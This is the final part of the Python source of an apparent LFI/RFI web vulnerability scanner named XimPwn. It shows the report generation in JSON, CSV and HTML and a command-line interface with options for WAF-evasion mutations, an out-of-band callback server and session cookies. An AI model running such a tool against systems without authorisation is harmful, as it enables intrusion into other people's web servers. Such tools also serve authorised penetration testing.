                "duration_seconds": round(time.monotonic() - self._scan_start, 2),
                "total_requests": self.http.request_count,
                "total_findings": len(self.findings),
                "concurrency": self.config.concurrency,
                "waf_detected": self.waf_engine.detected_waf,
            },
            "findings": [f.to_dict() for f in self.findings],
        }
        with open(path, "w") as fp:
            json.dump(data, fp, indent=2)

    def _write_csv(self, path: str):
        with open(path, "w", newline="") as fp:
            writer = csv.DictWriter(fp, fieldnames=[
                "url", "parameter", "payload", "vuln_type", "severity",
                "evidence", "method", "phase", "timestamp",
            ])
            writer.writeheader()
            for f in self.findings:
                writer.writerow(f.to_dict())

    def _write_html(self, path: str):
        severity_colors = {
            "Critical": "#dc3545",
            "High": "#e74c3c",
            "Medium": "#f39c12",
            "Low": "#27ae60",
        }

        sev_counts: dict[str, int] = {}
        for f in self.findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

        rows = ""
        for i, f in enumerate(self.findings, 1):
            color = severity_colors.get(f.severity, "#999")
            rows += f"""
            <tr>
                <td>{i}</td>
                <td><span class="badge" style="background:{color}">{escape(f.severity)}</span></td>
                <td>{escape(f.vuln_type)}</td>
                <td class="url">{escape(f.url)}</td>
                <td><code>{escape(f.parameter)}</code></td>
                <td class="payload"><code>{escape(f.payload[:100])}</code></td>
                <td class="evidence">{escape(f.evidence[:150]) if f.evidence else '-'}</td>
            </tr>"""

        crit = sev_counts.get("Critical", 0)
        high = sev_counts.get("High", 0)
        med = sev_counts.get("Medium", 0)
        low = sev_counts.get("Low", 0)
        total = len(self.findings)

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XimPwn Scan Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; padding: 2rem; }}
        h1 {{ color: #f0f6fc; margin-bottom: 0.5rem; font-size: 1.8rem; }}
        h2 {{ color: #8b949e; margin: 1.5rem 0 1rem; font-size: 1.2rem; font-weight: 500; }}
        .meta {{ color: #8b949e; margin-bottom: 2rem; font-size: 0.9rem; }}
        .meta span {{ margin-right: 1.5rem; }}
        table {{ width: 100%; border-collapse: collapse; font-size: 0.85rem; }}
        th {{ background: #161b22; color: #f0f6fc; padding: 12px; text-align: left; border-bottom: 2px solid #30363d; position: sticky; top: 0; }}
        td {{ padding: 10px 12px; border-bottom: 1px solid #21262d; vertical-align: top; }}
        tr:hover {{ background: #161b22; }}
        .badge {{ padding: 3px 8px; border-radius: 4px; color: white; font-weight: 600; font-size: 0.75rem; }}
        .url {{ max-width: 400px; word-break: break-all; }}
        .payload {{ max-width: 450px; word-break: break-all; }}
        code {{ background: #161b22; padding: 2px 6px; border-radius: 3px; font-size: 0.8rem; color: #79c0ff; }}
        .evidence {{ max-width: 500px; word-break: break-all; color: #8b949e; font-size: 0.8rem; }}
        .summary {{ display: flex; gap: 1.5rem; margin: 1rem 0 2rem; }}
        .summary-card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1rem 1.5rem; min-width: 120px; text-align: center; }}
        .summary-card .number {{ font-size: 2rem; font-weight: 700; }}
        .summary-card .label {{ color: #8b949e; font-size: 0.8rem; margin-top: 0.25rem; }}
    </style>
</head>
<body>
    <h1>⚡ XimPwn Scan Report</h1>
    <div class="meta">
        <span>🎯 Target: {escape(self.config.url)}</span>
        <span>🕐 {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}</span>
        <span>📡 {self.http.request_count} requests</span>
        <span>⏱️ {time.monotonic() - self._scan_start:.1f}s</span>
    </div>

    <div class="summary">
        <div class="summary-card">
            <div class="number" style="color:#dc3545">{crit}</div>
            <div class="label">Critical</div>
        </div>
        <div class="summary-card">
            <div class="number" style="color:#e74c3c">{high}</div>
            <div class="label">High</div>
        </div>
        <div class="summary-card">
            <div class="number" style="color:#f39c12">{med}</div>
            <div class="label">Medium</div>
        </div>
        <div class="summary-card">
            <div class="number" style="color:#27ae60">{low}</div>
            <div class="label">Low</div>
        </div>
        <div class="summary-card">
            <div class="number" style="color:#c9d1d9">{total}</div>
            <div class="label">Total</div>
        </div>
    </div>

    <h2>🎯 Findings</h2>
    <table>
        <thead>
            <tr>
                <th>#</th>
                <th>Severity</th>
                <th>Type</th>
                <th>URL</th>
                <th>Param</th>
                <th>Payload</th>
                <th>Evidence</th>
            </tr>
        </thead>
        <tbody>
            {rows}
        </tbody>
    </table>
</body>
</html>"""

        with open(path, "w") as fp:
            fp.write(html)


# ──────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────

def parse_args() -> ScannerConfig:
    parser = argparse.ArgumentParser(
        prog="pwn.py",
        description="⚡ XimPwn — Advanced LFI/RFI Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://target.com
  %(prog)s -u http://target.com --proxy http://127.0.0.1:8080 --waf-bypass
  %(prog)s -u http://target.com --cookie "session=abc" --auth "admin:pass"
  %(prog)s -u http://target.com --output report.html --format html
  %(prog)s -u http://target.com --oob-server http://your-vps:9999 --threads 50
        """,
    )

    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--proxy", help="HTTP proxy (http://host:port or socks5://)")
    parser.add_argument("--cookie", help="Cookie header (name=value; name2=value2)")
    parser.add_argument("--auth", help="Basic auth credentials (user:pass)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--threads", type=int, default=20, help="Max concurrent requests (default: 20)")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--format", choices=["json", "csv", "html", "terminal"],
                        default="terminal", help="Output format (default: terminal)")
    parser.add_argument("--blind-timeout", type=int, default=15,
                        help="Blind LFI timing threshold in seconds (default: 15)")
    parser.add_argument("--oob-server", help="OOB callback server URL (http://your-server:port)")
    parser.add_argument("--waf-bypass", action="store_true", help="Enable WAF evasion mutations")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--quick", action="store_true", help="Quick scan (reduced payload set)")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Crawl depth for discovery (default: 2)")
    parser.add_argument("--no-thor", action="store_true", help="Disable Thor cinematic UI (plain output)")

    args = parser.parse_args()

    # Validate URL
    url = args.url
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/")

    # Parse auth
    auth = None
    if args.auth:
        parts = args.auth.split(":", 1)
        if len(parts) == 2:
            auth = (parts[0], parts[1])

    # Auto-set output format from extension
    output_format = args.format
    if args.output:
        ext = Path(args.output).suffix.lower()
        if ext == ".json":
            output_format = "json"
        elif ext == ".csv":
            output_format = "csv"
        elif ext == ".html":
            output_format = "html"

    return ScannerConfig(
        url=url,
        proxy=args.proxy,
        cookie=args.cookie,
        auth=auth,
        timeout=args.timeout,
        delay=args.delay,
        concurrency=args.threads,
        output_file=args.output,
        output_format=output_format,
        blind_timeout=args.blind_timeout,
        oob_server=args.oob_server,
        waf_bypass=args.waf_bypass,
        verbose=args.verbose,
        quick=args.quick,
        crawl_depth=args.crawl_depth,
        no_thor=args.no_thor,
    )


def main():
    config = parse_args()
    scanner = Scanner(config)
    asyncio.run(scanner.run())


if __name__ == "__main__":
    main()
